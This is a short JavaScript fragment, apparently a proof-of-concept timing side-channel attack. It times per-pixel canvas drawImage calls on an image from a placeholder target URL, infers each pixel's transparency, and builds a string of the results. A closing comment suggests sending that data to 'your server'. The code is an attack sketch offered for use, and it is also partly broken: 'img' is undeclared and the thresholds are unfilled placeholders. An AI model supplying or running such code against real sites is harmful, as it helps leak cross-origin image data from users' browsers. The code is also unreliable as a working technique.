img.src = "<TARGET_IMAGE_URL>";

img.onload = () => {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  const width = img.width;
  const height = img.height;
  canvas.width = 1;
  canvas.height = 1;

  let pixelData = '';
  for (let y = 0; y < height; y++) {
    for (let x = 0; x < width; x++) {
      const startTime = performance.now();
      ctx.drawImage(img, x, y, 1, 1, 0, 0, 1, 1);
      const endTime = performance.now();
      const duration = endTime - startTime;

      // Threshold for transparency (tune based on observations)
      if (duration > YOUR_TRANSPARENT_THRESHOLD) {
        pixelData += '0'; // Transparent
      } else if (duration > YOUR_OPAQUE_THRESHOLD) {
        pixelData += '1'; // Opaque
      } else {
        pixelData += '2'; // Semi-transparent (or other)
      }
    }
  }
  console.log(pixelData); // Or send this data to your server
};
